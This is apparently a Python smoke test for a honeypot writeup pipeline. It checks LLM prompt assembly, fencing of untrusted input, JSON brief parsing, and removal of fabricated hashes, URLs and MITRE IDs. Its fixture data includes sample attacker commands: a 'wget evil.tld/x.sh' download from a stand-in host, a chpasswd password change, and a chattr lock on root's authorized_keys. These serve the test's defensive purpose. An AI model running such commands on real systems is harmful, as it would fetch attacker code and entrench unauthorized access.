"""Smoke test for `console.writeup` — the two-pass narrative writeup
pipeline.

Pure-function only; no ES, no LLM, no SQLite. Covers:
  - Pass 1 (extract): prompt template loads + substitutes placeholders
  - Pass 1 parsing: code-fenced JSON, prose-wrapped JSON, missing keys,
    invalid confidence_band
  - Verify pass: drops key_identifiers whose value isn't in source
  - Pass 2 (narrate): prompt template loads + carries the brief JSON
  - Cite-check: strips sentences citing unverified sha256/IPv4/URL/
    MITRE/ASN; verified citations pass through; inline footnotes inserted

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_writeup.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "console" / "src"))

from console.writeup import (
    build_extract_prompt,
    build_narrate_prompt,
    cite_check_prose,
    load_extract_template,
    load_narrate_template,
    parse_brief_response,
    verify_brief_against_source,
)

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


# ---------------------------------------------------------------------------
print("[1] extract prompt template loads + every placeholder substituted")
tmpl = load_extract_template()
for placeholder in [
    "<<<ANCHOR_KIND>>>", "<<<ANCHOR_NAME>>>", "<<<ANCHOR_EVIDENCE>>>",
    "<<<ANCHOR_WINDOW>>>", "<<<SCOPE_SUMMARY>>>",
    "<<<INTEL_SUMMARY>>>", "<<<EVIDENCE_QUALITY>>>",
]:
    check(f"extract placeholder {placeholder} present", placeholder in tmpl)

anchor = {
    "kind":     "playbook",
    "name":     "SSH Key Installer: chattr Lock",
    "evidence": "47 sessions across 19 IPs",
    "window":   "12d",
}
scope = {
    "ips": [{"ip": "1.2.3.4", "country": "RO", "asn": 12345, "intel_verdict": "malicious"}],
    "commands": [
        {"command_line": "echo X | chpasswd", "intent": "account_manipulation", "sha256": "abc123def456"},
        {"command_line": "chattr +i /root/.ssh/authorized_keys", "intent": "install_persistence"},
    ],
    "sessions": [{"session_id": "sid_a"}],
    "credentials": ["root:hunter2"],
    "urls":     [{"url": "http://evil.tld/x.sh"}],
    "hashes":   [{"sha256": "abc123def456789", "filename": "loader.sh"}],
    "playbooks": [{"name": "SSH Key Installer: chattr Lock"}],
    "campaigns": [{"name": "Defense-in-depth persistence"}],
    "intel": {"ip": {"malicious": 3, "clean": 1, "unknown": 15}},
    "analyst_artifacts": [{"kind": "tag", "value": "chattr_lock_marker", "notes": "the chattr +i call defines this"}],
    "lifecycle_notes": [{"anchor_label": "spb-xxx", "text": "first observed 2026-04-29"}],
    "session_sequences": [{"session_id": "sid_a", "commands": ["cd /tmp", "wget evil.tld/x.sh"]}],
}
extract_rendered = build_extract_prompt(anchor, scope, "Strong · 47 sess / 19 IPs · 12d", nonce="deadbeef")
for marker in ["playbook", "SSH Key Installer: chattr Lock", "12d",
               "Strong · 47 sess / 19 IPs · 12d",
               "1.2.3.4", "abc123def456"]:
    check(f"extract rendered carries {marker!r}", marker in extract_rendered)
check("no extract placeholders left", "<<<" not in extract_rendered)

# Fences applied to attacker-controlled blocks
check("commands block fenced",      "⟦UNTRUSTED:deadbeef:commands⟧" in extract_rendered)
check("urls block fenced",          "⟦UNTRUSTED:deadbeef:urls⟧" in extract_rendered)
check("hashes block fenced",        "⟦UNTRUSTED:deadbeef:hashes⟧" in extract_rendered)
check("credentials block fenced",   "⟦UNTRUSTED:deadbeef:credentials⟧" in extract_rendered)
check("session_ids block fenced",   "⟦UNTRUSTED:deadbeef:session_ids⟧" in extract_rendered)
check("session_sequences fenced",   "⟦UNTRUSTED:deadbeef:session_sequences⟧" in extract_rendered)

# ---------------------------------------------------------------------------
print("[2] brief parser handles the happy path")
ok_brief = """
{
  "timeframe_phrase": "over the past 12 days",
  "scale_phrase": "19 IPs across 5 countries",
  "what_they_did": "Installed an SSH key and locked it immutable.",
  "what_they_wanted": "Persistent SSH access.",
  "actor_model": "Likely automated botnet.",
  "viability_assessment": "Requires root, which they assume post-login.",
  "key_identifiers": [
    {"label": "shared RSA key", "value": "abc123def456", "why_it_matters": "tied across all 19 IPs"},
    {"label": "MITRE", "value": "T1098.004", "why_it_matters": "core technique"}
  ],
  "concerning_signals": ["chattr +i is counter-hardening."],
  "evidence_gaps": ["intel unknown on 15/19 IPs"],
  "confidence_band": "moderate",
  "confidence_reasoning": "Distinctive but intel sparse.",
  "defensive_angle": "Hunt for chattr +i on ~/.ssh."
}
"""
brief = parse_brief_response(ok_brief)
check("happy-path brief parsed", brief is not None)
check("brief carries all 12 keys", brief is not None and len(brief) == 12)
check("key_identifiers list of dicts", brief is not None and isinstance(brief["key_identifiers"], list) and len(brief["key_identifiers"]) == 2)
check("confidence_band normalised", brief is not None and brief["confidence_band"] == "moderate")

# ---------------------------------------------------------------------------
print("[3] brief parser tolerates wrapper modes")
prose_wrap = "Here's the brief:\n\n" + ok_brief + "\n\nDone."
check("prose-wrapped brief parses", parse_brief_response(prose_wrap) is not None)

fenced = "```json\n" + ok_brief + "\n```"
check("code-fenced brief parses",   parse_brief_response(fenced) is not None)

think_prefix = "<think>OK let me figure out what's going on...</think>\n" + ok_brief
check("thinking-model prefix parses", parse_brief_response(think_prefix) is not None)

# A think block that itself contains JSON-looking braces should not
# be picked up as the brief — the real brief is what comes after.
think_with_braces = (
    "<think>OK the user wants {something} or {nothing} — let me draft a plan</think>\n"
    + ok_brief
)
think_brief = parse_brief_response(think_with_braces)
check("think block with braces doesn't fool the parser",
      think_brief is not None and think_brief["timeframe_phrase"] == "over the past 12 days",
      detail=str(think_brief)[:80] if think_brief else "None")

# ---------------------------------------------------------------------------
print("[4] brief parser is defensive")
check("None returns None",        parse_brief_response(None) is None)  # type: ignore[arg-type]
check("not-JSON returns None",    parse_brief_response("absolutely no JSON here") is None)
check("array-at-root returns None", parse_brief_response("[1,2,3]") is None)

partial = parse_brief_response('{"timeframe_phrase":"x"}')
check("missing keys backfilled to empty",
      partial is not None
      and partial["key_identifiers"] == []
      and partial["evidence_gaps"]    == []
      and partial["scale_phrase"]     == "")

invalid_band = parse_brief_response(
    '{"timeframe_phrase":"x","confidence_band":"OK GOOD"}'
)
check("invalid confidence_band defaults to moderate",
      invalid_band is not None and invalid_band["confidence_band"] == "moderate")

# ---------------------------------------------------------------------------
print("[5] verify pass strips identifiers not in source")
# MITRE IDs are no longer part of the writeup source, so any MITRE value
# in key_identifiers is unverifiable and gets dropped alongside the
# fabricated hash.
brief_with_hallucination = {
    "key_identifiers": [
        {"label": "real hash",    "value": "abc123def456"},    # in extract_rendered
        {"label": "hallucinated", "value": "FFFF0000DEADBEEFCAFEBABE"},  # not in source
        {"label": "MITRE",        "value": "T1098.004"},     # MITRE no longer in source
    ],
}
cleaned, dropped = verify_brief_against_source(brief_with_hallucination, extract_rendered)
check("verify kept legitimate identifiers",
      len(cleaned["key_identifiers"]) == 1 and
      cleaned["key_identifiers"][0]["value"] == "abc123def456")
check("verify dropped hallucinated identifiers",
      set(dropped) == {"FFFF0000DEADBEEFCAFEBABE", "T1098.004"})

# ---------------------------------------------------------------------------
print("[6] narrate prompt template + substitution")
nrt = load_narrate_template()
check("narrate placeholder <<<BRIEF_JSON>>> present", "<<<BRIEF_JSON>>>" in nrt)
narrate_rendered = build_narrate_prompt(cleaned)
check("brief JSON substituted into narrate prompt",
      "abc123def456" in narrate_rendered)
check("no narrate placeholders left", "<<<" not in narrate_rendered)

# ---------------------------------------------------------------------------
print("[7] cite-check passes verified citations through")
verified_brief = {
    "key_identifiers": [
        {"label": "shared RSA key", "value": "abc123def456"},
    ],
}
prose_clean = (
    "Over the past 12 days the same RSA key (sha256:abc123def456) appeared across 19 IPs. "
    "No hallucinated identifiers here."
)
cleaned_prose, redactions = cite_check_prose(prose_clean, verified_brief, extract_rendered)
check("verified citations preserved", "abc123def456" in cleaned_prose)
check("no redactions emitted", redactions == [])
check("prose unchanged when clean", cleaned_prose == prose_clean.strip())

# ---------------------------------------------------------------------------
print("[8] cite-check strips unverified citations")
# MITRE IDs are never legitimate now (the pipeline doesn't derive them),
# so any MITRE ID in prose — real-looking or fabricated — is stripped
# because it can't be in key_identifiers.
prose_dirty = (
    "Over the past 12 days the same RSA key (sha256:abc123def456) appeared across 19 IPs. "
    "A fake hash sha256:deadbeefcafebabefffff0001234 was also dropped. "
    "T9999.999 was the hallucinated technique. "
    "The dropper came from http://hallucinated.example.com/x.sh and AS999999 hosted it."
)
cleaned_prose, redactions = cite_check_prose(prose_dirty, verified_brief, extract_rendered)
# Verified citations and their surrounding sentence text survive.
check("verified hash survives",          "abc123def456" in cleaned_prose)
# Sentence text around the unverified citation must be gone (the
# identifier itself may appear inside the footnote we leave behind —
# that's deliberate, the analyst needs to see what was stripped).
check("unverified-hash sentence stripped",
      "A fake hash" not in cleaned_prose)
check("unverified-MITRE sentence stripped",
      "the hallucinated technique" not in cleaned_prose)
check("unverified-URL sentence stripped",
      "The dropper came from" not in cleaned_prose)
# Footnotes inserted at each stripped position.
check("footnote inserted for sha256",
      "sentence removed: cited unverified sha256" in cleaned_prose)
check("footnote inserted for mitre",
      "sentence removed: cited unverified mitre" in cleaned_prose
      or "T9999.999" in [r["identifier"] for r in redactions])
check("redactions logged",               len(redactions) >= 3,
      detail=f"redactions={[r['identifier'] for r in redactions]}")

# ---------------------------------------------------------------------------
print("[9] cite-check defensive — false-positive guards")
# Short hex chunks inside ordinary prose shouldn't trigger.
short_hex = "The cluster had id 42 and used algorithm beefcafe.\n\nNothing else."
clean, r = cite_check_prose(short_hex, verified_brief, extract_rendered)
check("short hex chunks don't trigger", "beefcafe" in clean, detail=clean)

# Non-IP-looking number sequences shouldn't strip.
non_ip = "The server uptime was 999.999.999.999 days according to its claim. The end."
clean, r = cite_check_prose(non_ip, verified_brief, extract_rendered)
check("invalid IPv4 doesn't strip", "999.999.999.999" in clean, detail=clean)

# ---------------------------------------------------------------------------
print()
print(f"{len(PASSED)} passed, {len(FAILED)} failed")
if FAILED:
    for n, d in FAILED:
        print(f"  - {n}: {d}")
    sys.exit(1)
sys.exit(0)
